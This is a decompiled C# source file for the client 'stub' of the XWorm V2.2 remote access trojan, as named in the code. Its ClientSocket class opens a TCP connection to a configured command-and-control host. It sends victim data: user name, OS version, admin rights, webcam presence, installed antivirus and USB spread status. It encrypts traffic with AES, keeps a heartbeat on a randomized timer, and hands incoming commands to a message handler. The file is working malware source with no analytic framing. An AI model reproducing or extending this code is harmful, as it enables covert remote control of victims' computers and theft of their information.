using System;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace Stub;

public class ClientSocket
{
	public static bool isConnected = false;

	public static Socket S = null;

	private static long BufferLength = 0L;

	private static bool BufferLengthReceived = false;

	private static byte[] Buffer;

	private static MemoryStream MS = null;

	private static Timer Tick = null;

	public static ManualResetEvent allDone = new ManualResetEvent(initialState: false);

	private static object SendSync = null;

	public static readonly object SPL = Settings.SPL;

	public static void BeginConnect()
	{
		try
		{
			S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
			BufferLength = -1L;
			Buffer = new byte[1];
			MS = new MemoryStream();
			S.ReceiveBufferSize = 51200;
			S.SendBufferSize = 51200;
			S.Connect(Settings.Host, Conversions.ToInteger(Settings.Port));
			isConnected = true;
			SendSync = RuntimeHelpers.GetObjectValue(new object());
			Send(Conversions.ToString(Info()));
			S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, BeginReceive, null);
			TimerCallback callback = delegate
			{
				Ping();
			};
			Tick = new Timer(callback, null, new Random().Next(10000, 15000), new Random().Next(10000, 15000));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			isConnected = false;
			ProjectData.ClearProjectError();
		}
		finally
		{
			allDone.Set();
		}
	}

	public static object Info()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		ComputerInfo val = new ComputerInfo();
		return string.Concat("INFO", RuntimeHelpers.GetObjectValue(SPL), Helper.ID(), RuntimeHelpers.GetObjectValue(SPL), Environment.UserName, RuntimeHelpers.GetObjectValue(SPL), val.get_OSFullName().Replace("Microsoft", null), Environment.OSVersion.ServicePack.Replace("Service Pack", "SP") + " ", Environment.Is64BitOperatingSystem.ToString().Replace("False", "32bit").Replace("True", "64bit"), RuntimeHelpers.GetObjectValue(SPL), "XWorm V2.2", RuntimeHelpers.GetObjectValue(SPL), Helper.INDATE(), RuntimeHelpers.GetObjectValue(SPL), Helper.usbp(), RuntimeHelpers.GetObjectValue(SPL), Helper.admin(), RuntimeHelpers.GetObjectValue(SPL), Messages.Cam(), RuntimeHelpers.GetObjectValue(SPL), Helper.Antivirus(), RuntimeHelpers.GetObjectValue(SPL), Helper.Comment());
	}

	public static void BeginReceive(IAsyncResult ar)
	{
		if (!isConnected)
		{
			return;
		}
		checked
		{
			try
			{
				int num = S.EndReceive(ar);
				if (num > 0)
				{
					if (BufferLength == -1L)
					{
						if (Buffer[0] == 0)
						{
							BufferLength = Conversions.ToLong(Helper.BS(MS.ToArray()));
							MS.Dispose();
							MS = new MemoryStream();
							if (BufferLength == 0L)
							{
								BufferLength = -1L;
								S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, BeginReceive, S);
								return;
							}
							Buffer = new byte[(int)(BufferLength - 1L) + 1];
						}
						else
						{
							MS.WriteByte(Buffer[0]);
						}
					}
					else
					{
						MS.Write(Buffer, 0, num);
						if (MS.Length == BufferLength)
						{
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								BeginRead((byte[])a0);
							}, MS.ToArray());
							BufferLength = -1L;
							MS.Dispose();
							MS = new MemoryStream();
							Buffer = new byte[1];
						}
						else
						{
							Buffer = new byte[(int)(BufferLength - MS.Length - 1L) + 1];
						}
					}
					S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, BeginReceive, S);
				}
				else
				{
					isConnected = false;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				isConnected = false;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void BeginRead(byte[] b)
	{
		try
		{
			Messages.Read(b);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void Send(string msg)
	{
		object sendSync = SendSync;
		ObjectFlowControl.CheckForSyncLockOnValueType(sendSync);
		bool lockTaken = false;
		try
		{
			Monitor.Enter(sendSync, ref lockTaken);
			if (!isConnected)
			{
				return;
			}
			try
			{
				using MemoryStream memoryStream = new MemoryStream();
				byte[] array = Helper.AES_Encryptor(Helper.SB(msg));
				byte[] array2 = Helper.SB(Conversions.ToString(array.Length) + "\0");
				memoryStream.Write(array2, 0, array2.Length);
				memoryStream.Write(array, 0, array.Length);
				S.Poll(-1, SelectMode.SelectWrite);
				S.BeginSend(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None, EndSend, null);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				isConnected = false;
				ProjectData.ClearProjectError();
			}
		}
		finally
		{
			if (lockTaken)
			{
				Monitor.Exit(sendSync);
			}
		}
	}

	public static void EndSend(IAsyncResult ar)
	{
		try
		{
			S.EndSend(ar);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			isConnected = false;
			ProjectData.ClearProjectError();
		}
	}

	public static void isDisconnected()
	{
		if (Tick != null)
		{
			try
			{
				Tick.Dispose();
				Tick = null;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (MS != null)
		{
			try
			{
				MS.Close();
				MS.Dispose();
				MS = null;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		if (S != null)
		{
			try
			{
				S.Close();
				S.Dispose();
				S = null;
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
		GC.Collect();
	}

	public static void Ping()
	{
		try
		{
			if (isConnected)
			{
				Send("PING?");
				GC.Collect();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
